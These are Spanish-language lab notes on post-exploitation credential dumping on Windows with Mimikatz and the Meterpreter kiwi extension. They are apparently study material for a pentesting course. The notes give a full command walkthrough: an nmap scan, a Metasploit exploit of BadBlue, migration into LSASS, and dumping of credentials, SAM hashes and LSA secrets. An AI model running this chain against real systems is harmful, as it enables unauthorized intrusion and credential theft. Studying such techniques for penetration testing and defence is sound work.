Es una herramienta de postexplotacion
Permite la extraccion de password en texto claro, hashes y tickets de Kerberos de la memoria

Puede ser utilizado para exraer hashes de LSASS.exe process memory donde los hashes estan en cache

Utilizaremos un precompilado de mimikatz
si podemos acceder a una session meterpreter en Windows utilizaremos la extension de meterpreter kiwi

Mimikats requiere de privilegios elevados para correr corectamente

Al utilizar la extension no tendremos que copiar el ejecutable o un binario de mimikatz al target

Para interactuar con LSASS se necesitan permisos de administrator o de system

Practica

1- Nmap Scan
```
nmap -sV -sC -p- ip
```

2-Metasploit

```
msfconsole
>search badblue
>use exploit/windows/http/badblue_passthru
>show options
>set RHOST ip
meterpreter>sysinfo
meterpreter>getuid
meterpreter>pgrep lsas #Muestra el id del preceso 
788
meterpreter>migrate 788 #Migra la sesion a un proceso legitimo

meterpreter>load kiwi #Carga el modulo kiwi 
meterpreter>? # Muestra la ayuda de meterpreter
meterpreter>creds_all
meterpreter>lsa_dump_sam
meterpreter>lsa_dump_secret

#Ahora utilizaremos la app de mimikatz no el mdulo de meterpreter que es otra opcion
meterpreter>cd C:\\
meterpreter>mkdir Temp
meterpreter>cd Temp
meterpreter>upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
meterpreter>shell #abre un shell en la session
meterpreter>.\mimikatz.exe #Ejecuta mimikatz
meterpreter>privilege::debug #Chequear que tenemos los privilegios adecuados
Priviege 20 OK
meterpreter>lsadump::sam  #Dump de hashes
meterpreter>lsadump::secrets
```
